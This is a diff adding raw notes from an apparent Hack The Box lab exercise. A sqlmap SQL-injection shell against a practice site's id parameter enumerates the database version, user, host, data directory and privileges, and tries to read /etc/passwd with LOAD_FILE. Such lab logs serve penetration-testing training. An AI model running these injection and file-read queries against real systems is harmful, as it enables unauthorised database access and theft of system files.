@@ -1,0 +1,53 @@
+root@kali:~/HTB/Unattended# sqlmap -u https://www.nestedflanders.htb/index.php?id=587 --sql-shell
+
+sql-shell> SELECT @@version
+[18:39:27] [INFO] fetching SQL SELECT statement query output: 'SELECT @@version'
+[18:39:27] [INFO] retrieved: 10.1.37-MariaDB-0+deb9u1
+SELECT @@version:    '10.1.37-MariaDB-0+deb9u1'
+sql-shell> 
+sql-shell> SELECT user();
+[18:44:49] [INFO] fetching SQL SELECT statement query output: 'SELECT user()'
+[18:44:49] [INFO] retrieved: nestedflanders@localhost
+SELECT user():    'nestedflanders@localhost'
+sql-shell> SELECT current_user();
+[19:26:02] [INFO] fetching SQL SELECT statement query output: 'SELECT current_user()'
+[19:26:02] [INFO] retrieved: nestedflanders@localhost
+SELECT current_user():    'nestedflanders@localhost'
+sql-shell> SELECT @@hostname;
+[19:00:32] [INFO] fetching SQL SELECT statement query output: 'SELECT @@hostname'
+[19:00:32] [INFO] retrieved: unattended
+SELECT @@hostname:    'unattended'
+sql-shell> SELECT LOAD_FILE("/etc/passwd");
+[18:57:04] [INFO] fetching SQL SELECT statement query output: 'SELECT LOAD_FILE("/etc/passwd")'
+[18:57:04] [INFO] retrieved:   
+SELECT LOAD_FILE("/etc/passwd"):    ' '
+sql-shell> SELECT @@datadir;
+[19:11:18] [INFO] fetching SQL SELECT statement query output: 'SELECT @@datadir'
+[19:11:18] [INFO] retrieved: /var/lib/mysql/
+SELECT @@datadir:    '/var/lib/mysql/'
+sql-shell> 
+
+LIST DBA
+
+sql-shell> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = "SUPER";
+[19:37:55] [INFO] fetching SQL SELECT statement query output: 'SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = "SUPER"'
+[19:37:55] [INFO] the SQL query provided has more than one field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind
+[19:37:55] [INFO] resumed: 0
+[19:37:55] [INFO] the SQL query provided has more than one field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind
+[19:37:55] [INFO] resumed: 0
+sql-shell> 
+
+PRIV
+
+sql-shell> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;
+[19:38:56] [INFO] fetching SQL SELECT statement query output: 'SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges'
+[19:38:56] [INFO] the SQL query provided has more than one field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind
+[19:38:56] [INFO] retrieved: 1
+[19:39:03] [INFO] retrieved: 'nestedflanders'@'localhost'
+[19:41:36] [INFO] retrieved: USAGE
+[19:42:17] [INFO] retrieved: NO
+SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges [1]:
+[*] 'nestedflanders'@'localhost', USAGE, NO
+
+sql-shell> 
+
